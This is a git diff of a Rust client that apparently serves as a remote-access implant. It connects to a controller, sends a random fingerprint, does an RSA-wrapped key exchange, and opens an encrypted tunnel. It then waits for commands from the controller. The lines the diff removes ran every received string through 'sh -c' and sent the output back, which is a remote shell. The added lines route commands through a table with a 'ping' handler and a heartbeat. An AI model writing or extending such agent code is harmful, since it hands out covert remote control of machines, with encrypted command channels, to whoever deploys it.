@@ -1,16 +1,17 @@
 mod crypto;
+mod commands;
 
 use crate::crypto::EncryptedTunnel;
 
 use std::io::{self, Read, Write};
 use std::net::TcpStream;
-use std::process::Command;
+use std::collections::HashMap;
 
 use rand::{distributions::Alphanumeric, Rng};
 use rsa::pkcs1::DecodeRsaPublicKey;
 use rsa::{Pkcs1v15Encrypt, RsaPublicKey};
 
-// TODO: add commands
+type CommandFunction = Box<dyn Fn(&mut EncryptedTunnel)>;
 
 const BUFFER: usize = 1024;
 
@@ -31,17 +32,15 @@ fn generate_bytes(l: usize) -> Vec<u8> {
         .collect()
 }
 
-fn main() -> Result<(), io::Error> {
+fn init_connection(mut conn: TcpStream, mut buffer: [u8; BUFFER]) -> Result<EncryptedTunnel, io::Error> {
+    let fingerprint: String = generate_fingerprint();
+    
     let mut rng = rand::thread_rng();
-    let mut buffer = [0; BUFFER];
-    let fingerprint = generate_fingerprint();
 
-    let mut socket = TcpStream::connect("127.0.0.1:7777")?;
-
-    socket.write_all(fingerprint.as_bytes())?;
+    conn.write_all(fingerprint.as_bytes())?;
 
     let public_key = {
-        let readed = socket.read(&mut buffer)?;
+        let readed = conn.read(&mut buffer)?;
         RsaPublicKey::from_pkcs1_pem(
             String::from_utf8_lossy(&mut buffer[..readed])
                 .to_string()
@@ -59,32 +58,42 @@ fn main() -> Result<(), io::Error> {
         keyiv_concat.extend(&key);
         keyiv_concat.extend(&iv);
 
-        socket.write_all(
+        conn.write_all(
             &public_key
                 .encrypt(&mut rng, Pkcs1v15Encrypt, &keyiv_concat)
                 .unwrap(),
         )?;
     }
 
-    let mut enctunnel = EncryptedTunnel::new(key.as_slice(), iv.as_slice(), socket);
+    let enctunnel = EncryptedTunnel::new(key.as_slice(), iv.as_slice(), conn);
+
+    return Ok(enctunnel);
+}
+
+fn main() -> Result<(), io::Error> {
+    let mut buffer: [u8; 1024] = [0; BUFFER];
+
+    let socket = TcpStream::connect("127.0.0.1:7777")?;
+
+    let mut enctunnel = init_connection(socket, buffer).expect("Init connection failed");
+
+    let mut commands: HashMap<&str, CommandFunction> = HashMap::new();
+    commands.insert("ping", Box::new(commands::ping));
 
     loop {
         let cmd = String::from_utf8(enctunnel.recv(&mut buffer)?).unwrap();
 
-        match cmd.as_str() {
-            "2" => {
-                enctunnel.send(b"3".to_vec()).unwrap();
-            }
-            _ => {
-                let mut output = Command::new("sh")
-                    .arg("-c")
-                    .arg(cmd)
-                    .output()
-                    .expect("Failed execute command");
+        let cmd = cmd.as_str();
 
-                output.stdout.extend(output.stderr);
+        println!("{}", cmd);
 
-                enctunnel.send(output.stdout).unwrap();
+        if cmd == "2" {
+            enctunnel.socket.write_all(b"3").unwrap();
+        }
+        else if commands.contains_key(cmd) {
+            match commands.get(cmd) {
+                Some(cmd_func) => cmd_func(&mut enctunnel),
+                None => (),
             }
         }
     }
